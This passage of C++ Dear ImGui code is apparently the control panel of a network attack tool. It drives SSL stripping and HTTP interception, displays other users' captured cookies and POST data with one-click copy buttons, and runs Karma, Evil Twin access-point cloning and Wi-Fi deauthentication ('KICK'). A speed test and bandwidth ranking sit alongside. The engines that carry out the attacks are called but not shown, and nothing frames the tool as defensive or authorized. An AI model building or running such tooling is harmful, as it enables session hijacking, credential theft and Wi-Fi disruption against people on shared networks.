            ImGui::TextColored(ColorDimWhite, "Path:");     ImGui::SameLine(110); ImGui::Text("%s", c.path.c_str());
        } else {
            ImGui::TextColored(ColorDimWhite, "Status:");   ImGui::SameLine(110);
            ImVec4 sc = (c.statusCode >= 200 && c.statusCode < 300) ? ColorGreen : 
                        (c.statusCode >= 300 && c.statusCode < 400) ? ColorYellow : ColorRed;
            ImGui::TextColored(sc, "%d", c.statusCode);
        }

        if (!c.userAgent.empty()) {
            ImGui::TextColored(ColorDimWhite, "User-Agent:"); ImGui::SameLine(110); ImGui::TextWrapped("%s", c.userAgent.c_str());
        }
        if (!c.contentType.empty()) {
            ImGui::TextColored(ColorDimWhite, "Content-Type:"); ImGui::SameLine(110); ImGui::Text("%s", c.contentType.c_str());
        }
        if (!c.referer.empty()) {
            ImGui::TextColored(ColorDimWhite, "Referer:");  ImGui::SameLine(110); ImGui::TextWrapped("%s", c.referer.c_str());
        }
        if (c.wasStripped) {
            ImGui::Spacing();
            ImGui::TextColored(ColorRed, "[SSL STRIPPED] This URL was downgraded from HTTPS");
        }

        // Cookie section
        if (!c.cookie.empty()) {
            ImGui::Spacing();
            ImGui::Separator();
            ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.4f, 1.0f), "COOKIES");
            ImGui::SameLine(0, 10);
            if (ImGui::SmallButton("Copy Cookies")) ImGui::SetClipboardText(c.cookie.c_str());
            ImGui::BeginChild("CookieView", ImVec2(0, 80), true);
            ImGui::TextWrapped("%s", c.cookie.c_str());
            ImGui::EndChild();
        }
        
        // POST data section
        if (!c.postData.empty()) {
            ImGui::Spacing();
            ImGui::Separator();
            ImGui::TextColored(ImVec4(1.0f, 0.6f, 0.2f, 1.0f), "POST DATA");
            ImGui::SameLine(0, 10);
            if (ImGui::SmallButton("Copy POST")) ImGui::SetClipboardText(c.postData.c_str());
            ImGui::BeginChild("PostView", ImVec2(0, 100), true);
            ImGui::TextWrapped("%s", c.postData.c_str());
            ImGui::EndChild();
        }
    }
    ImGui::End();
}

static void RenderAdvanced() {
    float t = (float)ImGui::GetTime();

    // Sub-tab selector — snapshot state BEFORE buttons to ensure balanced Push/Pop
    int curTab = g_advSubTab;
    ImVec4 btnNormal(0.15f, 0.15f, 0.2f, 0.9f);
    ImVec4 btnActive(0.0f, 0.5f, 0.7f, 0.9f);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 0) ? btnActive : btnNormal);
    if (ImGui::Button("  SPEED TEST  ", ImVec2(140, 30))) g_advSubTab = 0;
    ImGui::PopStyleColor();
    ImGui::SameLine(0, 4);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 1) ? btnActive : btnNormal);
    if (ImGui::Button("  BANDWIDTH RANK  ", ImVec2(160, 30))) g_advSubTab = 1;
    ImGui::PopStyleColor();
    ImGui::SameLine(0, 4);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 2) ? btnActive : btnNormal);
    if (ImGui::Button("  SSL STRIP / HTTP CAPTURE  ", ImVec2(240, 30))) g_advSubTab = 2;
    ImGui::PopStyleColor();
    ImGui::SameLine(0, 4);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 3) ? btnActive : btnNormal);
    if (ImGui::Button("  WIRELESS DECEPTION  ", ImVec2(200, 30))) g_advSubTab = 3;
    ImGui::PopStyleColor();
    ImGui::SameLine(0, 4);

    ImGui::PushStyleColor(ImGuiCol_Button, (curTab == 4) ? btnActive : btnNormal);
    if (ImGui::Button("  RAW WIFI DEAUTH  ", ImVec2(200, 30))) g_advSubTab = 4;
    ImGui::PopStyleColor();

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // =====================================================================
    // Sub-tab 0: SPEED TEST
    // =====================================================================
    if (g_advSubTab == 0) {
        auto result = g_speedTest.getResult();
        
        // Control buttons
        if (g_speedTest.isTesting()) {
            float pulse = sinf(t * 3.0f) * 0.2f + 0.8f;
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(pulse * 0.8f, pulse * 0.4f, 0.0f, 1.0f));
            ImGui::Button("  TESTING...  ", ImVec2(160, 36));
            ImGui::PopStyleColor();
        } else {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.6f, 0.3f, 0.9f));
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.0f, 0.8f, 0.4f, 1.0f));
            if (ImGui::Button("  RUN SPEED TEST  ", ImVec2(160, 36))) {
                auto ni = g_arp.getNetworkInfo();
                g_speedTest.setLinkSpeed(ni.linkSpeed);
                g_speedTest.startTest();
            }
            ImGui::PopStyleColor(2);
        }
        
        ImGui::SameLine(0, 20);
        ImGui::TextColored(ColorDimWhite, "Status: %s", result.status.empty() ? "idle" : result.status.c_str());
        ImGui::SameLine(0, 20);
        if (!result.server.empty()) {
            ImGui::TextColored(ColorDimCyan, "Server: %s", result.server.c_str());
        }
        
        ImGui::Spacing();
        
        // Progress bar
        if (g_speedTest.isTesting()) {
            ImGui::PushStyleColor(ImGuiCol_PlotHistogram, ImVec4(0.0f, 0.7f, 0.9f, 0.9f));
            ImGui::ProgressBar((float)result.progress, ImVec2(-1, 20));
            ImGui::PopStyleColor();
        }
        
        ImGui::Spacing();
        ImGui::Separator();
        ImGui::Spacing();

        // Results display — big numbers
        float panelW = ImGui::GetContentRegionAvail().x;
        float colW = panelW / 4.0f;
        
        // Download Speed
        ImGui::BeginGroup();
        ImGui::TextColored(ColorDimWhite, "DOWNLOAD");
        if (result.downloadMbps > 0) {
            ImGui::SetWindowFontScale(1.8f);
            ImGui::TextColored(ColorGreen, "%.1f", result.downloadMbps);
            ImGui::SetWindowFontScale(1.0f);
            ImGui::TextColored(ColorDimWhite, "Mbps");
        } else {
            ImGui::TextColored(ColorDimWhite, "--");
        }
        ImGui::EndGroup();
        
        ImGui::SameLine(colW);
        ImGui::BeginGroup();
        ImGui::TextColored(ColorDimWhite, "LATENCY");
        if (result.latencyMs > 0) {
            ImGui::SetWindowFontScale(1.8f);
            ImGui::TextColored(ColorCyan, "%.0f", result.latencyMs);
            ImGui::SetWindowFontScale(1.0f);
            ImGui::TextColored(ColorDimWhite, "ms");
        } else {
            ImGui::TextColored(ColorDimWhite, "--");
        }
        ImGui::EndGroup();
        
        ImGui::SameLine(colW * 2);
        ImGui::BeginGroup();
        ImGui::TextColored(ColorDimWhite, "JITTER");
        if (result.jitterMs > 0 || result.status == "complete") {
            ImGui::SetWindowFontScale(1.8f);
            ImVec4 jitColor = (result.jitterMs < 5) ? ColorGreen : (result.jitterMs < 20) ? ColorYellow : ColorRed;
            ImGui::TextColored(jitColor, "%.1f", result.jitterMs);
            ImGui::SetWindowFontScale(1.0f);
            ImGui::TextColored(ColorDimWhite, "ms");
        } else {
            ImGui::TextColored(ColorDimWhite, "--");
        }
        ImGui::EndGroup();
        
        ImGui::SameLine(colW * 3);
        ImGui::BeginGroup();
        ImGui::TextColored(ColorDimWhite, "EFFICIENCY");
        if (result.efficiencyPercent > 0) {
            ImGui::SetWindowFontScale(1.8f);
            ImVec4 effColor = (result.efficiencyPercent > 70) ? ColorGreen : (result.efficiencyPercent > 40) ? ColorYellow : ColorRed;
            ImGui::TextColored(effColor, "%.0f%%", result.efficiencyPercent);
            ImGui::SetWindowFontScale(1.0f);
            ImGui::TextColored(ColorDimWhite, "of %s", g_arp.getNetworkInfo().linkSpeed.c_str());
        } else {
            ImGui::TextColored(ColorDimWhite, "--");
        }
        ImGui::EndGroup();
        
        ImGui::Spacing();
        if (result.bytesDownloaded > 0) {
            ImGui::TextColored(ColorDimWhite, "Downloaded: %s", FormatBytes(result.bytesDownloaded).c_str());
        }

        // Test history
        ImGui::Spacing();
        ImGui::Separator();
        ImGui::Spacing();
        auto history = g_speedTest.getHistory();
        if (!history.empty()) {
            ImGui::TextColored(ColorCyan, "TEST HISTORY (%zu)", history.size());
            if (ImGui::BeginTable("SpeedHistory", 5, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_SizingFixedFit)) {
                ImGui::TableSetupColumn("#",        ImGuiTableColumnFlags_WidthFixed, 30.0f);
                ImGui::TableSetupColumn("Download", ImGuiTableColumnFlags_WidthFixed, 100.0f);
                ImGui::TableSetupColumn("Latency",  ImGuiTableColumnFlags_WidthFixed, 80.0f);
                ImGui::TableSetupColumn("Jitter",   ImGuiTableColumnFlags_WidthFixed, 80.0f);
                ImGui::TableSetupColumn("Server",   ImGuiTableColumnFlags_WidthStretch, 1.0f);
                ImGui::TableHeadersRow();
                for (int i = (int)history.size() - 1; i >= 0; --i) {
                    auto& h = history[i];
                    ImGui::TableNextRow();
                    ImGui::TableSetColumnIndex(0); ImGui::Text("%d", i + 1);
                    ImGui::TableSetColumnIndex(1); ImGui::TextColored(ColorGreen, "%.1f Mbps", h.downloadMbps);
                    ImGui::TableSetColumnIndex(2); ImGui::Text("%.0f ms", h.latencyMs);
                    ImGui::TableSetColumnIndex(3); ImGui::Text("%.1f ms", h.jitterMs);
                    ImGui::TableSetColumnIndex(4); ImGui::Text("%s", h.server.c_str());
                }
                ImGui::EndTable();
            }
        }
    }

    // =====================================================================
    // Sub-tab 1: BANDWIDTH RANKING
    // =====================================================================
    if (g_advSubTab == 1) {
        ImGui::TextColored(ColorCyan, "BANDWIDTH RANKING");
        ImGui::SameLine(0, 20);
        
        if (!g_snifferStarted) {
            ImGui::TextColored(ColorRed, "[Start capture in Packet Sniffer tab first]");
        } else {
            ImGui::TextColored(ColorGreen, "[LIVE]");
        }
        
        ImGui::Spacing();
        
        auto trafficStats = g_sniffer.getTrafficStats();
        auto deviceList = g_arp.getDeviceList();
        std::map<std::string, DeviceInfo> deviceMap;
        for (auto& d : deviceList) deviceMap[d.ip] = d;
        
        auto ranking = SslStripEngine::buildBandwidthRanking(trafficStats, g_arp.getLocalIp(), deviceMap);
        
        if (ImGui::BeginTable("BandwidthRank", 6, 
            ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_SizingFixedFit | ImGuiTableFlags_ScrollY,
            ImVec2(0, -1))) {
            
            ImGui::TableSetupColumn("Rank",    ImGuiTableColumnFlags_WidthFixed, 40.0f);
            ImGui::TableSetupColumn("IP",      ImGuiTableColumnFlags_WidthFixed, 130.0f);
            ImGui::TableSetupColumn("Vendor",  ImGuiTableColumnFlags_WidthFixed, 100.0f);
            ImGui::TableSetupColumn("Total",   ImGuiTableColumnFlags_WidthFixed, 100.0f);
            ImGui::TableSetupColumn("Rate",    ImGuiTableColumnFlags_WidthFixed, 100.0f);
            ImGui::TableSetupColumn("Share",   ImGuiTableColumnFlags_WidthStretch, 1.0f);
            ImGui::TableSetupScrollFreeze(0, 1);
            ImGui::TableHeadersRow();
            
            for (int i = 0; i < (int)ranking.size(); ++i) {
                auto& r = ranking[i];
                ImGui::TableNextRow();
                
                ImVec4 rowColor = r.isLocal ? ColorGreen : ColorWhite;
                
                ImGui::TableSetColumnIndex(0);
                if (i == 0) ImGui::TextColored(ColorYellow, "#1");
                else ImGui::Text("#%d", i + 1);
                
                ImGui::TableSetColumnIndex(1);
                ImGui::TextColored(rowColor, "%s", r.ip.c_str());
                if (r.isLocal) {
                    ImGui::SameLine();
                    ImGui::TextColored(ColorGreen, "[YOU]");
                }
                
                ImGui::TableSetColumnIndex(2);
                ImGui::TextColored(ColorDimCyan, "%s", r.vendor.c_str());
                
                ImGui::TableSetColumnIndex(3);
                ImGui::Text("%s", FormatBytes(r.totalBytes).c_str());
                
                ImGui::TableSetColumnIndex(4);
                if (r.rateMbps > 1.0)
                    ImGui::TextColored(ColorYellow, "%.1f Mbps", r.rateMbps);
                else
                    ImGui::TextColored(ColorDimWhite, "%.2f Mbps", r.rateMbps);
                
                ImGui::TableSetColumnIndex(5);
                // Visual bar showing percentage
                float pct = (float)(r.percentOfTotal / 100.0);
                ImVec4 barColor = r.isLocal ? ImVec4(0.0f, 0.7f, 0.3f, 0.8f) : 
                                  (i == 0 ? ImVec4(0.8f, 0.3f, 0.0f, 0.8f) : ImVec4(0.3f, 0.5f, 0.7f, 0.6f));
                ImGui::PushStyleColor(ImGuiCol_PlotHistogram, barColor);
                char overlay[32];
                snprintf(overlay, sizeof(overlay), "%.1f%%", r.percentOfTotal);
                ImGui::ProgressBar(pct, ImVec2(-1, 18), overlay);
                ImGui::PopStyleColor();
            }
            ImGui::EndTable();
        }
    }

    // =====================================================================
    // Sub-tab 2: SSL STRIP / HTTP CAPTURE
    // =====================================================================
    if (g_advSubTab == 2) {
        // Controls
        ImGui::TextColored(ColorCyan, "SSL STRIP / HTTP INTERCEPTOR");
        ImGui::SameLine(0, 20);
        
        // Start/Stop capture
        if (!g_sslStripStarted) {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.5f, 0.3f, 0.8f));
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.0f, 0.7f, 0.4f, 0.9f));
            if (ImGui::Button("  START HTTP CAPTURE  ", ImVec2(180, 28))) {
                if (g_sslStrip.start()) {
                    g_sslStripStarted = true;
                }
            }
            ImGui::PopStyleColor(2);
        } else {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.6f, 0.2f, 0.0f, 0.8f));
            if (ImGui::Button("  STOP CAPTURE  ", ImVec2(140, 28))) {
                g_sslStrip.stop();
                g_sslStripStarted = false;
            }
            ImGui::PopStyleColor();
        }
        
        // SSL Strip toggle
        ImGui::SameLine(0, 15);
        if (g_sslStrip.isSslStripEnabled()) {
            float pulse = sinf(t * 3.0f) * 0.3f + 0.7f;
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(pulse, 0.0f, pulse * 0.3f, 1.0f));
            if (ImGui::Button("  STRIP: ON  ", ImVec2(120, 28))) {
                g_sslStrip.enableSslStrip(false);
            }
            ImGui::PopStyleColor();
        } else {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.3f, 0.0f, 0.3f, 0.7f));
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.5f, 0.0f, 0.5f, 0.9f));
            if (ImGui::Button("  SSL STRIP  ", ImVec2(120, 28))) {
                g_sslStrip.enableSslStrip(true);
            }
            ImGui::PopStyleColor(2);
        }
        
        ImGui::SameLine(0, 15);
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.4f, 0.2f, 0.0f, 0.7f));
        if (ImGui::Button("Clear", ImVec2(60, 28))) {
            g_sslStrip.clearCaptures();
        }
        ImGui::PopStyleColor();

        // Stats line
        ImGui::SameLine(0, 20);
        ImGui::TextColored(ColorDimWhite, "Packets: %llu", g_sslStrip.getHttpPacketsProcessed());
        ImGui::SameLine(0, 15);
        ImGui::TextColored(ColorDimWhite, "Captures: %zu", g_sslStrip.getCaptureCount());
        if (g_sslStrip.getStrippedCount() > 0) {
            ImGui::SameLine(0, 15);
            ImGui::TextColored(ColorRed, "Stripped: %llu", g_sslStrip.getStrippedCount());
        }
        if (g_sslStrip.getProxiedCount() > 0) {
            ImGui::SameLine(0, 15);
            ImGui::TextColored(ColorMagenta, "Proxied: %llu", g_sslStrip.getProxiedCount());
        }

        ImGui::Spacing();
        ImGui::Separator();
        ImGui::Spacing();

        // HTTP capture table
        auto captures = g_sslStrip.getCaptures(500);
        
        ImGuiTableFlags capFlags = ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg |
                                    ImGuiTableFlags_Resizable | ImGuiTableFlags_ScrollY |
                                    ImGuiTableFlags_SizingFixedFit;

        if (ImGui::BeginTable("HttpCaptures", 7, capFlags, ImVec2(0, -1))) {
            ImGui::TableSetupColumn("Src IP",   ImGuiTableColumnFlags_WidthFixed, 120.0f);
            ImGui::TableSetupColumn("Method",   ImGuiTableColumnFlags_WidthFixed, 50.0f);
            ImGui::TableSetupColumn("URL / Status", ImGuiTableColumnFlags_WidthStretch, 1.0f);
            ImGui::TableSetupColumn("Host",     ImGuiTableColumnFlags_WidthFixed, 150.0f);
            ImGui::TableSetupColumn("Type",     ImGuiTableColumnFlags_WidthFixed, 100.0f);
            ImGui::TableSetupColumn("Cookie",   ImGuiTableColumnFlags_WidthFixed, 50.0f);
            ImGui::TableSetupColumn("Strip",    ImGuiTableColumnFlags_WidthFixed, 40.0f);
            ImGui::TableSetupScrollFreeze(0, 1);
            ImGui::TableHeadersRow();

            // Show most recent first
            for (int i = (int)captures.size() - 1; i >= 0; --i) {
                auto& c = captures[i];
                ImGui::TableNextRow();
                ImGui::PushID((int)c.id);

                // Src IP
                ImGui::TableSetColumnIndex(0);
                ImGui::Text("%s", c.srcIp.c_str());

                // Method
                ImGui::TableSetColumnIndex(1);
                if (c.isResponse) {
                    ImVec4 sc = (c.statusCode >= 200 && c.statusCode < 300) ? ColorGreen : 
                                (c.statusCode >= 300 && c.statusCode < 400) ? ColorYellow : ColorRed;
                    ImGui::TextColored(sc, "%d", c.statusCode);
                } else {
                    ImVec4 mc = ColorYellow;
                    if (c.method == "POST") mc = ColorOrange;
                    else if (c.method == "GET") mc = ColorGreen;
                    ImGui::TextColored(mc, "%s", c.method.c_str());
                }

                // URL / Status
                ImGui::TableSetColumnIndex(2);
                if (!c.isResponse) {
                    ImGui::TextColored(ColorWhite, "%s", c.fullUrl.c_str());
                    // Right-click for detail
                    if (ImGui::IsItemClicked(ImGuiMouseButton_Right)) {
                        g_showHttpDetail = true;
                        g_httpDetail = c;
                    }
                    if (ImGui::IsItemHovered()) {
                        ImGui::SetTooltip("Right-click for full detail (headers, cookies, POST data)");
                    }
                } else {
                    ImGui::TextColored(ColorDimWhite, "Response %d (%s)", c.statusCode, c.contentType.c_str());
                }

                // Host
                ImGui::TableSetColumnIndex(3);
                ImGui::TextColored(ColorDimCyan, "%s", c.host.c_str());

                // Content-Type
                ImGui::TableSetColumnIndex(4);
                ImGui::TextColored(ColorDimWhite, "%s", c.contentType.c_str());

                // Cookie indicator
                ImGui::TableSetColumnIndex(5);
                if (!c.cookie.empty()) {
                    ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.4f, 1.0f), "YES");
                } else {
                    ImGui::TextColored(ColorDimWhite, "-");
                }

                // Strip indicator
                ImGui::TableSetColumnIndex(6);
                if (c.wasStripped) {
                    ImGui::TextColored(ColorRed, "!");
                }

                ImGui::PopID();
            }
            ImGui::EndTable();
        }
    }

    // =====================================================================
    // Sub-tab 3: WIRELESS DECEPTION (Karma & Evil Twin)
    // =====================================================================
    if (g_advSubTab == 3) {
        // Initialize Karma engine on first visit
        if (!g_karmaInitialized) {
            g_karmaInitialized = g_karma.initialize();
        }
        
        ImGui::TextColored(ImVec4(1.0f, 0.3f, 0.5f, 1.0f), "LAYER 2 WIRELESS DECEPTION");
        ImGui::SameLine(0, 15);
        ImGui::TextColored(ColorDimWhite, "Karma & Evil Twin Framework");
        ImGui::SameLine(0, 15);
        
        // Status message
        std::string karmaStatus = g_karma.getStatusMessage();
        if (!karmaStatus.empty()) {
            ImGui::TextColored(ColorDimCyan, "%s", karmaStatus.c_str());
        }
        
        ImGui::Spacing();
        
        if (!g_karmaInitialized) {
            ImGui::TextColored(ColorRed, "WiFi adapter not available. Ensure a wireless adapter is installed.");
            ImGui::Spacing();
            if (ImGui::Button("  RETRY INIT  ", ImVec2(140, 30))) {
                g_karmaInitialized = g_karma.initialize();
            }
        } else {
            // ============== CONTROL BAR ==============
            // Scan button
            if (g_karma.isScanning()) {
                float pulse = sinf(t * 3.0f) * 0.2f + 0.8f;
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, pulse * 0.5f, pulse, 0.9f));
                ImGui::Button("  SCANNING...  ", ImVec2(130, 30));
                ImGui::PopStyleColor();
            } else {
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.5f, 0.6f, 0.8f));
                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.0f, 0.7f, 0.8f, 0.9f));
                if (ImGui::Button("  SCAN WIFI  ", ImVec2(130, 30))) {
                    g_karma.scanNetworks();
                }
                ImGui::PopStyleColor(2);
            }
            
            // Probe Monitor toggle
            ImGui::SameLine(0, 8);
            if (g_karma.isProbeMonitorActive()) {
                float pulse = sinf(t * 2.0f) * 0.2f + 0.8f;
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(pulse * 0.6f, 0.0f, pulse * 0.8f, 0.9f));
                if (ImGui::Button("  PROBE MON: ON  ", ImVec2(150, 30))) {
                    g_karma.stopProbeMonitor();
                }
                ImGui::PopStyleColor();
            } else {
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.3f, 0.0f, 0.4f, 0.7f));
                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.5f, 0.0f, 0.6f, 0.9f));
                if (ImGui::Button("  PROBE MON  ", ImVec2(150, 30))) {
                    g_karma.startProbeMonitor();
                }
                ImGui::PopStyleColor(2);
            }
            
            // Karma Mode toggle
            ImGui::SameLine(0, 8);
            if (g_karma.isKarmaModeActive()) {
                float pulse = sinf(t * 3.0f) * 0.3f + 0.7f;
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(pulse, pulse * 0.2f, 0.0f, 1.0f));
                if (ImGui::Button("  KARMA: ON  ", ImVec2(120, 30))) {
                    g_karma.stopKarmaMode();
                }
                ImGui::PopStyleColor();
            } else {
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.2f, 0.0f, 0.7f));
                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.7f, 0.3f, 0.0f, 0.9f));
                if (ImGui::Button("  KARMA  ", ImVec2(120, 30))) {
                    if (!g_karma.isProbeMonitorActive()) g_karma.startProbeMonitor();
                    g_karma.startKarmaMode();
                }
                ImGui::PopStyleColor(2);
            }
            
            // Evil Twin controls
            ImGui::SameLine(0, 8);
            if (g_karma.isEvilTwinActive()) {
                float pulse = sinf(t * 2.5f) * 0.2f + 0.8f;
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(pulse * 0.8f, 0.0f, 0.0f, 0.9f));
                if (ImGui::Button("  STOP TWIN  ", ImVec2(120, 30))) {
                    g_karma.stopEvilTwin();
                }
                ImGui::PopStyleColor();
            } else {
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.6f, 0.0f, 0.0f, 0.7f));
                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.8f, 0.0f, 0.0f, 0.9f));
                if (ImGui::Button("  EVIL TWIN  ", ImVec2(120, 30))) {
                    std::string ssid = g_evilTwinSSID;
                    std::string pass = g_evilTwinPassword;
                    if (!ssid.empty()) {
                        g_karma.startEvilTwin(ssid, pass);
                    }
                }
                ImGui::PopStyleColor(2);
            }
            
            // Stop All
            ImGui::SameLine(0, 8);
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.3f, 0.0f, 0.7f));
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.7f, 0.4f, 0.0f, 0.9f));
            if (ImGui::Button("  STOP ALL  ", ImVec2(100, 30))) {
                g_karma.stopKarmaMode();
                g_karma.stopEvilTwin();
                g_karma.stopProbeMonitor();
                g_karma.stopAllDeauth();
            }
            ImGui::PopStyleColor(2);
            
            ImGui::Spacing();
            
            // Evil Twin configuration
            ImGui::TextColored(ColorDimWhite, "Twin SSID:");
            ImGui::SameLine();
            ImGui::SetNextItemWidth(200);
            ImGui::InputText("##twinSSID", g_evilTwinSSID, sizeof(g_evilTwinSSID));
            ImGui::SameLine(0, 10);
            ImGui::TextColored(ColorDimWhite, "Password:");
            ImGui::SameLine();
            ImGui::SetNextItemWidth(150);
            ImGui::InputText("##twinPass", g_evilTwinPassword, sizeof(g_evilTwinPassword));
            
            // Status indicators
            ImGui::SameLine(0, 15);
            if (g_karma.isEvilTwinActive()) {
                float p = sinf(t * 2.0f) * 0.3f + 0.7f;
                ImGui::TextColored(ImVec4(p, 0.0f, 0.0f, 1.0f), "[TWIN: %s]", g_karma.getEvilTwinSSID().c_str());
            }
            if (g_karma.isKarmaModeActive()) {
                ImGui::SameLine(0, 8);
                float p = sinf(t * 3.0f) * 0.3f + 0.7f;
                ImGui::TextColored(ImVec4(p, p * 0.3f, 0.0f, 1.0f), "[KARMA]");
            }
            if (g_karma.isDeauthActive()) {
                ImGui::SameLine(0, 8);
                float p = sinf(t * 4.0f) * 0.3f + 0.7f;
                ImGui::TextColored(ImVec4(p, 0.0f, p * 0.5f, 1.0f), "[DEAUTH: %d pkts]", g_karma.getDeauthPacketCount());
            }
            
            ImGui::Spacing();
            ImGui::Separator();
            ImGui::Spacing();
            
            // ============== TWO-COLUMN LAYOUT ==============
            float panelWidth = ImGui::GetContentRegionAvail().x;
            float leftWidth = panelWidth * 0.55f;
            float rightWidth = panelWidth * 0.43f;
            
            // LEFT PANEL: WiFi Networks
            ImGui::BeginChild("WifiNetworksPanel", ImVec2(leftWidth, -1), true);
            ImGui::TextColored(ColorCyan, "NEARBY WIFI NETWORKS (%d)", g_karma.getNetworkCount());
            ImGui::Spacing();
            
            auto networks = g_karma.getNetworkList();
            if (ImGui::BeginTable("WifiTable", 7, 
                ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_ScrollY | ImGuiTableFlags_SizingFixedFit,
                ImVec2(0, -1))) {
                
                ImGui::TableSetupColumn("SSID",     ImGuiTableColumnFlags_WidthFixed, 140.0f);
                ImGui::TableSetupColumn("BSSID",    ImGuiTableColumnFlags_WidthFixed, 120.0f);
                ImGui::TableSetupColumn("CH",       ImGuiTableColumnFlags_WidthFixed, 30.0f);
                ImGui::TableSetupColumn("Signal",   ImGuiTableColumnFlags_WidthFixed, 60.0f);
                ImGui::TableSetupColumn("Security", ImGuiTableColumnFlags_WidthFixed, 80.0f);
                ImGui::TableSetupColumn("Clone",    ImGuiTableColumnFlags_WidthFixed, 50.0f);
                ImGui::TableSetupColumn("Deauth",   ImGuiTableColumnFlags_WidthFixed, 55.0f);
                ImGui::TableSetupScrollFreeze(0, 1);
                ImGui::TableHeadersRow();
                
                for (int i = 0; i < (int)networks.size(); ++i) {
                    auto& net = networks[i];
                    ImGui::TableNextRow();
                    ImGui::PushID(i);
                    
                    // SSID
                    ImGui::TableSetColumnIndex(0);
                    ImGui::TextColored(net.ssid == "[Hidden]" ? ColorDimWhite : ColorWhite, "%s", net.ssid.c_str());
                    
                    // BSSID
                    ImGui::TableSetColumnIndex(1);
                    ImGui::TextColored(ColorDimWhite, "%s", net.bssid.c_str());
                    
                    // Channel
                    ImGui::TableSetColumnIndex(2);
                    ImGui::Text("%d", net.channel);
                    
                    // Signal (visual bar)
                    ImGui::TableSetColumnIndex(3);
                    float sig = net.signalQuality / 100.0f;
                    ImVec4 sigColor = (sig > 0.7f) ? ColorGreen : (sig > 0.4f) ? ColorYellow : ColorRed;
                    ImGui::PushStyleColor(ImGuiCol_PlotHistogram, sigColor);
                    char sigBuf[16];
                    snprintf(sigBuf, sizeof(sigBuf), "%d%%", net.signalQuality);
                    ImGui::ProgressBar(sig, ImVec2(55, 14), sigBuf);
                    ImGui::PopStyleColor();
                    
                    // Security
                    ImGui::TableSetColumnIndex(4);
                    ImVec4 secColor = ColorGreen;
                    if (net.security.find("WPA3") != std::string::npos) secColor = ImVec4(1.0f, 0.3f, 0.3f, 1.0f);
                    else if (net.security.find("WPA2") != std::string::npos) secColor = ColorYellow;
                    else if (net.security.find("Open") != std::string::npos) secColor = ColorGreen;
                    else secColor = ColorOrange;
                    ImGui::TextColored(secColor, "%s", net.security.c_str());
                    
                    // Clone button (copy SSID to Evil Twin)
                    ImGui::TableSetColumnIndex(5);
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.0f, 0.0f, 0.7f));
                    if (ImGui::SmallButton("CLONE")) {
                        strncpy_s(g_evilTwinSSID, sizeof(g_evilTwinSSID), net.ssid.c_str(), _TRUNCATE);
                    }
                    ImGui::PopStyleColor();
                    
                    // Deauth button
                    ImGui::TableSetColumnIndex(6);
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.7f, 0.0f, 0.2f, 0.7f));
                    if (ImGui::SmallButton("KICK")) {
                        g_karma.deauthAllClients(net.bssid, net.channel);
                    }
                    ImGui::PopStyleColor();
                    
                    ImGui::PopID();
                }
                ImGui::EndTable();
            }
            ImGui::EndChild();
            
            // RIGHT PANEL: Probe Requests
            ImGui::SameLine(0, panelWidth * 0.02f);
            ImGui::BeginChild("ProbePanel", ImVec2(rightWidth, -1), true);
            ImGui::TextColored(ImVec4(0.8f, 0.3f, 1.0f, 1.0f), "PROBE REQUESTS (%d)", g_karma.getProbeCount());
            
            if (g_karma.getProbeCount() > 0) {
                ImGui::SameLine(0, 10);
                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.3f, 0.0f, 0.0f, 0.6f));
                if (ImGui::SmallButton("Clear")) {
                    g_karma.clearProbeRequests();
                }
                ImGui::PopStyleColor();
            }
            
            ImGui::Spacing();
            
            auto probes = g_karma.getProbeRequests();
            if (probes.empty()) {
                ImGui::TextColored(ColorDimWhite, "No probe requests captured yet.");
                ImGui::TextColored(ColorDimWhite, "Start Probe Monitor to begin.");
            } else {
                if (ImGui::BeginTable("ProbeTable", 4, 
                    ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_ScrollY | ImGuiTableFlags_SizingFixedFit,
                    ImVec2(0, -1))) {
                    
                    ImGui::TableSetupColumn("Device MAC",  ImGuiTableColumnFlags_WidthFixed, 130.0f);
                    ImGui::TableSetupColumn("Probing For", ImGuiTableColumnFlags_WidthStretch, 1.0f);
                    ImGui::TableSetupColumn("Signal",      ImGuiTableColumnFlags_WidthFixed, 50.0f);
